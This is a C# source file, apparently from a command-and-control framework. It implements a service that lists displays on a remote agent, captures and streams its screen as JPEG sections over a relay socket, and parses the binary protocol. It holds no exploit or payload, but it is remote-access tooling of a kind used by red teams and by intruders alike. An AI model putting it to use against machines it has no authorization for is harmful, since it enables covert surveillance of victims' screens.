using C2.Features.Relay;
using C2.Infrastructure;

namespace C2.Features.Vnc;

/// <summary>
/// Manages VNC display enumeration, frame capture, and streaming for a single agent session.
/// One instance per VncPanel — not registered in DI (panel owns the lifetime).
/// Rendering is done via JS canvas — this service only handles protocol and raw bytes.
/// </summary>
public sealed class VncService : IDisposable
{
    private readonly RelaySocket _relay;
    private readonly MessageService _msg;
    private CancellationTokenSource? _streamCts;
    private bool _hasFrame;

    // FPS tracking
    private int _frameCount;
    private DateTime _fpsWindow = DateTime.UtcNow;

    public VncService(RelaySocket relay, MessageService msg)
    {
        _relay = relay;
        _msg = msg;
    }

    // --- Public state ---

    public DisplayInfo[] Displays { get; private set; } = [];
    public int SelectedDisplay { get; set; }
    public uint Quality { get; set; } = 75;
    public bool IsStreaming { get; private set; }
    public bool IsCapturing { get; private set; }
    public bool IsLoadingDisplays { get; private set; }
    public int Fps { get; private set; }
    public bool IsConnected => _relay is { IsConnected: true };

    /// <summary>Raised when UI state changes (streaming toggled, displays loaded, etc.).</summary>
    public event Action? StateChanged;

    /// <summary>Raised with the full parsed frame: (isFullFrame, sections). Single JS interop call per frame.</summary>
    public event Func<bool, ScreenSection[], Task>? FrameReady;

    /// <summary>Raised when streaming starts or stops (bool = isStreaming).</summary>
    public event Action<bool>? StreamingChanged;

    // --- Display enumeration ---

    public async Task FetchDisplaysAsync()
    {
        IsLoadingDisplays = true;
        NotifyChanged();

        try
        {
            var payload = RelaySocket.BuildGetDisplays();
            var response = await _relay.SendAndReceive(payload);
            if (response is null || response.Length < 8)
            {
                Displays = [];
                return;
            }

            var status = RelaySocket.ReadStatus(response);
            if (status != 0)
            {
                _msg.Warn("Failed to enumerate displays.");
                Displays = [];
                return;
            }

            Displays = ParseDisplays(response);

            // Default to primary display
            SelectedDisplay = 0;
            for (var i = 0; i < Displays.Length; i++)
            {
                if (Displays[i].Primary) { SelectedDisplay = i; break; }
            }
        }
        catch (Exception ex)
        {
            _msg.Error($"Display enumeration failed: {ex.Message}");
            Displays = [];
        }
        finally
        {
            IsLoadingDisplays = false;
            NotifyChanged();
        }
    }

    // --- Single capture ---

    public async Task CaptureOnceAsync()
    {
        if (!IsConnected || Displays.Length == 0) return;
        IsCapturing = true;
        NotifyChanged();

        try
        {
            await CaptureFrameAsync();
        }
        finally
        {
            IsCapturing = false;
            NotifyChanged();
        }
    }

    // --- Streaming ---

    public async Task StartStreamingAsync()
    {
        if (!IsConnected || Displays.Length == 0) return;

        IsStreaming = true;
        _frameCount = 0;
        _fpsWindow = DateTime.UtcNow;
        Fps = 0;
        _streamCts = new CancellationTokenSource();
        StreamingChanged?.Invoke(true);
        NotifyChanged();

        var ct = _streamCts.Token;
        try
        {
            while (!ct.IsCancellationRequested && IsConnected)
            {
                await CaptureFrameAsync();
                // Batch UI updates — only refresh when FPS counter updates
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            _msg.Error($"Stream error: {ex.Message}");
        }
        finally
        {
            IsStreaming = false;
            Fps = 0;
            StreamingChanged?.Invoke(false);
            NotifyChanged();
        }
    }

    public void StopStreaming()
    {
        _streamCts?.Cancel();
        _streamCts?.Dispose();
        _streamCts = null;
    }

    /// <summary>Reset frame state (e.g. when display or quality changes).</summary>
    public void ResetFrame()
    {
        _hasFrame = false;
    }

    // --- Internals ---

    private async Task CaptureFrameAsync()
    {
        var fullScreen = !_hasFrame;
        var payload = RelaySocket.BuildGetScreenshot((uint)SelectedDisplay, fullScreen, Quality);
        var response = await _relay.SendAndReceive(payload);
        if (response is null || response.Length < 8) return;

        var status = RelaySocket.ReadStatus(response);
        if (status != 0) return;

        var sections = ParseScreenshot(response);
        if (sections.Length == 0) return;

        if (fullScreen)
            _hasFrame = true;

        if (FrameReady is not null)
            await FrameReady.Invoke(fullScreen, sections);

        UpdateFps();
    }

    private void UpdateFps()
    {
        _frameCount++;
        var elapsed = (DateTime.UtcNow - _fpsWindow).TotalSeconds;
        if (elapsed >= 1.0)
        {
            Fps = (int)(_frameCount / elapsed);
            _frameCount = 0;
            _fpsWindow = DateTime.UtcNow;
            NotifyChanged(); // Update UI with new FPS
        }
    }

    private void NotifyChanged() => StateChanged?.Invoke();

    // --- Protocol parsers ---

    internal static DisplayInfo[] ParseDisplays(byte[] response)
    {
        var count = BitConverter.ToUInt32(response, 4);
        var devices = new DisplayInfo[count];
        const int deviceSize = 17;
        var offset = 8;
        for (var i = 0; i < (int)count; i++)
        {
            devices[i] = new DisplayInfo
            {
                Index = i,
                Left = BitConverter.ToInt32(response, offset),
                Top = BitConverter.ToInt32(response, offset + 4),
                Width = BitConverter.ToUInt32(response, offset + 8),
                Height = BitConverter.ToUInt32(response, offset + 12),
                Primary = response[offset + 16] != 0
            };
            offset += deviceSize;
        }
        return devices;
    }

    internal static ScreenSection[] ParseScreenshot(byte[] response)
    {
        if (response.Length < 8) return [];

        var sectionCount = BitConverter.ToUInt32(response, 4);
        var sections = new ScreenSection[sectionCount];
        var offset = 8;

        for (var i = 0; i < (int)sectionCount; i++)
        {
            if (offset + 12 > response.Length) break;

            var x = BitConverter.ToUInt32(response, offset);
            var y = BitConverter.ToUInt32(response, offset + 4);
            var jpegSize = BitConverter.ToUInt32(response, offset + 8);
            offset += 12;

            if (offset + (int)jpegSize > response.Length) break;

            var data = new byte[jpegSize];
            Array.Copy(response, offset, data, 0, (int)jpegSize);
            offset += (int)jpegSize;

            sections[i] = new ScreenSection(x, y, data);
        }

        return sections;
    }

    public void Dispose()
    {
        StopStreaming();
    }
}
